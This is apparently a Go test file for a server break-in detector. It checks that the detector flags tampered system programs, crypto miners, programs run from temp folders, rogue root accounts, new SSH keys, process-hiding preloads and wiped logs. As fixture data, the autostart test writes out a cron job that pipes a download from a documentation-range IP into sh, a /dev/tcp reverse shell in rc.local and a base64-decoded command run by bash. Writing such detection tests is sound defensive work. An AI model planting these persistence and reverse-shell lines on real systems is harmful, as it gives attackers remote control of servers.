package checks

import (
	"io/fs"
	"strings"
	"testing"
	"testing/fstest"
	"time"
)

// cleanServer is an ordinary Ubuntu server: two people who sign in, the
// usual cron jobs and units, nginx and the agent running, and logs that go
// on. None of it is a sign of a break-in.
func cleanServer() *testEnv {
	t := newTestEnv()
	t.file("etc/passwd", strings.Join([]string{
		"root:x:0:0:root:/root:/bin/bash",
		"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
		"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
		"sshd:x:105:65534::/run/sshd:/usr/sbin/nologin",
		"ada:x:1000:1000:Ada:/home/ada:/bin/bash",
		"deploy:x:1001:1001::/home/deploy:/bin/sh",
	}, "\n"))
	t.file("etc/crontab", "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"+
		"17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"+
		"25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n")
	// A cleanup job that names /tmp but runs find, not a program in /tmp.
	t.file("etc/cron.d/cleanup", "MAILTO=ops@example.com\n0 3 * * * root find /tmp -type f -mtime +7 -delete\n")
	t.file("etc/cron.d/kiyesi-backup", "0 2 * * * root /usr/local/bin/kiyesi run backup -- /usr/local/bin/backup.sh\n")
	t.file("etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n")
	t.file("var/spool/cron/crontabs/deploy", "# m h dom mon dow command\n*/5 * * * * /home/deploy/app/bin/queue-work\n")
	t.file("etc/systemd/system/kiyesi.service", "[Service]\nExecStart=/usr/local/bin/kiyesi agent\n")
	t.file("etc/systemd/system/app.service", "[Service]\nExecStartPre=-/usr/bin/docker compose pull\nExecStart=/usr/bin/docker compose up\n")
	t.file("etc/rc.local", "#!/bin/sh -e\nexit 0\n")
	old := now.Add(-60 * 24 * time.Hour)
	t.fs["home/ada/.ssh/authorized_keys"] = &fstest.MapFile{Data: []byte("ssh-ed25519 AAAA ada@laptop\n"), Mode: 0o600, ModTime: old}
	t.fs["root/.ssh/authorized_keys"] = &fstest.MapFile{Data: []byte("ssh-ed25519 AAAA ada@laptop\n"), Mode: 0o600, ModTime: old}
	t.fs["home/ada/.bash_history"] = &fstest.MapFile{Data: []byte("ls\n"), Mode: 0o600}
	t.fs["var/log/auth.log"] = &fstest.MapFile{Data: []byte("sshd: Accepted publickey for ada\n"), ModTime: now.Add(-10 * time.Minute)}
	t.fs["var/log/syslog"] = &fstest.MapFile{Data: []byte("cron ran\n"), ModTime: now.Add(-time.Minute)}
	proc(t, "1", "systemd", "/sbin/init\x00splash")
	proc(t, "812", "nginx", "nginx: master process /usr/sbin/nginx\x00")
	proc(t, "990", "kiyesi", "/usr/local/bin/kiyesi\x00agent")
	proc(t, "1204", "node", "node\x00/srv/app/server.js")
	t.fs["proc/990/exe"] = &fstest.MapFile{Data: []byte("/usr/local/bin/kiyesi"), Mode: fs.ModeSymlink}
	// A program replaced by an update while running reads as deleted: not a sign.
	t.fs["proc/812/exe"] = &fstest.MapFile{Data: []byte("/usr/sbin/nginx (deleted)"), Mode: fs.ModeSymlink}
	t.command("dpkg --verify", "??5??????  c /etc/nginx/nginx.conf\n??5??????  c /etc/ssh/sshd_config\n")
	return t
}

func proc(t *testEnv, pid, comm, cmdline string) {
	t.file("proc/"+pid+"/comm", comm+"\n")
	t.file("proc/"+pid+"/cmdline", cmdline)
}

func TestBreakInCleanServerHasNoSigns(t *testing.T) {
	r := run(t, breachCheck{}, cleanServer())
	wantStatus(t, r, StatusPass)
}

func TestBreakInNeedsRoot(t *testing.T) {
	e := cleanServer()
	e.root = false
	r := run(t, breachCheck{}, e)
	if r.Status != StatusSkip || r.SkipKey != "needs-root" {
		t.Fatalf("got %+v, want a needs-root skip: no signs without root would mislead", r)
	}
}

func TestBreakInChangedProgram(t *testing.T) {
	e := cleanServer().command("dpkg --verify", "??5??????  c /etc/nginx/nginx.conf\n"+
		"??5??????   /usr/sbin/sshd\n??5??????   /usr/bin/ps\n"+
		"??5??????   /usr/share/doc/x/README\nmissing     /usr/bin/old\n")
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "changed-program")
	if v := r.Findings[0].Vars; v["count"] != "2" || v["path"] != "/usr/bin/ps" {
		t.Errorf("vars = %v, want the 2 programs, first in order /usr/bin/ps; settings, docs and missing files left out", v)
	}
}

func TestBreakInChangedProgramOnRedHat(t *testing.T) {
	e := cleanServer()
	delete(e.runner.has, "dpkg")
	e.command("rpm -Va --nomtime --nosize --nouser --nogroup --nomode --nordev --nocaps",
		"S.5....T.  c /etc/ssh/sshd_config\n..5......    /usr/lib64/security/pam_unix.so\n")
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "changed-program")
	if r.Findings[0].Vars["path"] != "/usr/lib64/security/pam_unix.so" {
		t.Errorf("vars = %v, want the changed sign-in module", r.Findings[0].Vars)
	}
}

func TestBreakInVerifyIsReusedForADay(t *testing.T) {
	e := cleanServer().command("dpkg --verify", "??5??????   /usr/bin/ps\n")
	env := e.env()
	env.ReuseSlowFor = 6 * time.Hour
	if r := (breachCheck{}).Run(t.Context(), env); len(r.Findings) != 1 {
		t.Fatalf("first run: %+v", r)
	}
	e.runner.ran = nil
	env2 := e.env()
	env2.ReuseSlowFor = 6 * time.Hour
	if r := (breachCheck{}).Run(t.Context(), env2); len(r.Findings) != 1 || r.Findings[0].Key != "changed-program" {
		t.Fatalf("second run: %+v", r)
	}
	for _, c := range e.runner.ran {
		if strings.HasPrefix(c, "dpkg") {
			t.Fatalf("dpkg ran again within a day: %v", e.runner.ran)
		}
	}
	// A scan by hand always compares afresh.
	e.runner.ran = nil
	run(t, breachCheck{}, e)
	if len(e.runner.ran) == 0 {
		t.Fatal("a scan by hand reused the comparison")
	}
}

func TestBreakInMiner(t *testing.T) {
	e := cleanServer()
	proc(e, "4242", "kdevtmpfsi", "/tmp/kdevtmpfsi\x00")
	proc(e, "4243", "systemd-helper", "./systemd-helper\x00-o\x00stratum+tcp://pool.example:3333\x00-u\x00wallet")
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "miner", "miner")
	for _, f := range r.Findings {
		for _, v := range f.Vars {
			if strings.Contains(v, "wallet") || strings.Contains(v, "stratum") {
				t.Errorf("a command line reached the report: %v", f.Vars)
			}
		}
	}
}

func TestBreakInProgramFromTemp(t *testing.T) {
	e := cleanServer()
	proc(e, "5000", "x", "/dev/shm/.x/x\x00-d")
	proc(e, "5001", "upd", "upd\x00")
	e.fs["proc/5001/exe"] = &fstest.MapFile{Data: []byte("/var/tmp/.cache/upd (deleted)"), Mode: fs.ModeSymlink}
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "temp-program", "temp-program")
	if v := r.Findings[0].Vars; v["folder"] != "/dev/shm" || v["pid"] != "5000" {
		t.Errorf("vars = %v", v)
	}
	if v := r.Findings[1].Vars; v["folder"] != "/var/tmp" {
		t.Errorf("vars = %v, want the program from its exe link", v)
	}
}

func TestBreakInAutostarts(t *testing.T) {
	e := cleanServer()
	e.file("etc/cron.d/update", "*/10 * * * * root curl -fsSL http://203.0.113.9/u.sh | sh\n")
	e.file("var/spool/cron/crontabs/www-data", "@reboot /tmp/.ice/run\n")
	e.file("etc/systemd/system/dbus-helper.service", "[Service]\nExecStart=/dev/shm/dbus-helper --quiet\n")
	e.file("etc/rc.local", "#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.4/4444 0>&1\nexit 0\n")
	e.file("etc/cron.hourly/sync", "#!/bin/sh\necho aGkK | base64 -d | bash\n")
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "autostart-download", "autostart-temp", "autostart-download", "autostart-temp", "autostart-download")
	want := []string{"/etc/cron.d/update", "/var/spool/cron/crontabs/www-data", "/etc/cron.hourly/sync", "/etc/systemd/system/dbus-helper.service", "/etc/rc.local"}
	for i, f := range r.Findings {
		if f.Vars["path"] != want[i] {
			t.Errorf("finding %d path = %q, want %q", i, f.Vars["path"], want[i])
		}
		if len(f.Vars) != 1 {
			t.Errorf("finding %d carries more than the path: %v", i, f.Vars)
		}
	}
}

func TestBreakInAccounts(t *testing.T) {
	e := cleanServer()
	env := e.env()
	if r := (breachCheck{}).Run(t.Context(), env); r.Status != StatusPass {
		t.Fatalf("first scan only remembers the accounts: %+v", r)
	}
	e.file("etc/passwd", string(e.fs["etc/passwd"].Data)+"\ntoor:x:0:0::/root:/bin/bash\nsupport:x:1002:1002::/home/support:/bin/bash\n")
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "extra-root", "new-account", "new-account")
	if r.Findings[1].Vars["user"] != "support" || r.Findings[2].Vars["user"] != "toor" {
		t.Errorf("findings = %+v", r.Findings)
	}
	// A week later the new accounts are no longer pointed out; the second
	// root stays.
	e2 := *e
	later := now.Add(8 * 24 * time.Hour)
	env2 := e2.env()
	env2.Sys.Now = func() time.Time { return later }
	r2 := (breachCheck{}).Run(t.Context(), env2)
	wantStatus(t, r2, StatusFail, "extra-root")
}

func TestBreakInNewKey(t *testing.T) {
	e := cleanServer()
	e.fs["home/deploy/.ssh/authorized_keys"] = &fstest.MapFile{Data: []byte("ssh-rsa AAAA x\n"), Mode: 0o600, ModTime: now.Add(-2 * 24 * time.Hour)}
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "new-key")
	if v := r.Findings[0].Vars; v["user"] != "deploy" || v["date"] != "6 Oct 2026" {
		t.Errorf("vars = %v", v)
	}
}

func TestBreakInPreloadAndQuietLogs(t *testing.T) {
	e := cleanServer()
	e.file("etc/ld.so.preload", "# nothing\n/usr/local/lib/libprocesshider.so\n")
	e.fs["root/.bash_history"] = &fstest.MapFile{Data: []byte("/dev/null"), Mode: fs.ModeSymlink}
	e.fs["var/log/auth.log"] = &fstest.MapFile{ModTime: now.Add(-3 * 24 * time.Hour)}
	r := run(t, breachCheck{}, e)
	wantStatus(t, r, StatusFail, "preload", "history-off", "auth-log-empty")
	if r.Findings[0].Vars["path"] != "/usr/local/lib/libprocesshider.so" || r.Findings[1].Vars["user"] != "root" {
		t.Errorf("findings = %+v", r.Findings)
	}
}

func TestBreakInEmptySignInLogAfterRotationIsNotASign(t *testing.T) {
	e := cleanServer()
	// Rotated an hour ago: empty, and recent.
	e.fs["var/log/auth.log"] = &fstest.MapFile{ModTime: now.Add(-time.Hour)}
	wantStatus(t, run(t, breachCheck{}, e), StatusPass)
	// Empty for days, but so is the system log: logging is off, not wiped.
	e.fs["var/log/auth.log"] = &fstest.MapFile{ModTime: now.Add(-3 * 24 * time.Hour)}
	e.fs["var/log/syslog"] = &fstest.MapFile{ModTime: now.Add(-3 * 24 * time.Hour)}
	wantStatus(t, run(t, breachCheck{}, e), StatusPass)
}

func TestBreakInNamesArePrintable(t *testing.T) {
	e := cleanServer()
	proc(e, "6000", "\x1b[2J{evil}", "w\x00-o\x00stratum+tcp://p:1")
	r := run(t, breachCheck{}, e)
	if len(r.Findings) != 1 {
		t.Fatalf("findings = %+v", r.Findings)
	}
	if n := r.Findings[0].Vars["name"]; strings.ContainsAny(n, "\x1b{}") {
		t.Errorf("name = %q, want control characters and braces removed", n)
	}
}
